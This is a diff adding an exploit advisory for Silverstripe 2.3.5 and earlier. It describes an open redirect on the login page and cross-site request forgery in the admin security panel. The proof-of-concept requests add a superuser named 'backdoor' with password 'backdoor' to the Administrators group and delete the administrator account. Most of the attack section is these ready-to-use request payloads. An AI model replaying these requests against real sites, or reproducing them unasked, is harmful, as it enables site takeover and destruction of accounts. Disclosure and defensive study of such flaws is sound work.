@@ -1,0 +1,42 @@
+# Exploit Title: Silverstripe <= 2.3.5 Cross Site Request Forgery & Open Redirection.
+# Date: 12/01/10
+# Author: cp77fk4r | empty0page[SHIFT+2]gmail.com | www.DigitalWhisper.co.il
+# Vendor: www.silverstripe.org | 
+# Version: 2.0.0
+# Tested on: PHP
+#
+#
+##Open Redirection:
+(OWASP: An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.)
+#
+http://server/Security/login?BackURL=[URL]
+#
+PoC:
+http://server/Security/login?BackURL=http://www.google.com
+#
+#
+##Cross Site Request Forgery
+(CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation in case of normal user. If the targeted end user is the administrator account, this can compromise the entire web application.)
+#
+Add new Superuser Account:
+#
+HTTP GET: /admin/security/EditForm?fieldName=Members&action_callfieldmethod&methodName=addtogroup
+HTTP POST: ajax=1&Title=Administrators&MemberSearch=&ctf%5BID%5D=1&MemberFieldName=Members&MemberDontShowPassword=&MemberFilterButton=Filter&FirstName=[BACKDOOR]&Surname=[BACKDOOR]&Email=[MAIL]&SetPassword=[BACKDOOR]&ctf%5BID%5D=1&SecurityID=160711687&action_addtogroup%3FformController%3Dadmin%2Fsecurity%2FEditForm%2Ffield%2FMembers%2FAddRecordForm=Add&Permissions%5B1%5D%5BArg%5D=0&Permissions%5Bnew%5D%5BArg%5D%5B%5D=&ID=1&SecurityID=160711687
+#
+PoC: (Username: backdoor; Password: backdoor)
+HTTP GET: /admin/security/EditForm?fieldName=Members&action_callfieldmethod&methodName=addtogroup
+HTTP POST: ajax=1&Title=Administrators&MemberSearch=&ctf%5BID%5D=1&MemberFieldName=Members&MemberDontShowPassword=&MemberFilterButton=Filter&FirstName=backdoor&Surname=backdoor&Email=blah%40blah.blah&SetPassword=backdoor&ctf%5BID%5D=1&SecurityID=160711687&action_addtogroup%3FformController%3Dadmin%2Fsecurity%2FEditForm%2Ffield%2FMembers%2FAddRecordForm=Add&Permissions%5B1%5D%5BArg%5D=0&Permissions%5Bnew%5D%5BArg%5D%5B%5D=&ID=1&SecurityID=160711687
+#
+#
+Delete user: [id]=user id (by default, the admin id is 1)
+#
+HTTP GET: /admin/security/EditForm/field/Members/item/[id]/delete
+HTTP POST: forceajax=1
+#
+PoC: (delete the Admin account)
+HTTP GET: /admin/security/EditForm/field/Members/item/1/delete
+HTTP POST: forceajax=1
+#
+#
+[e0f]
+
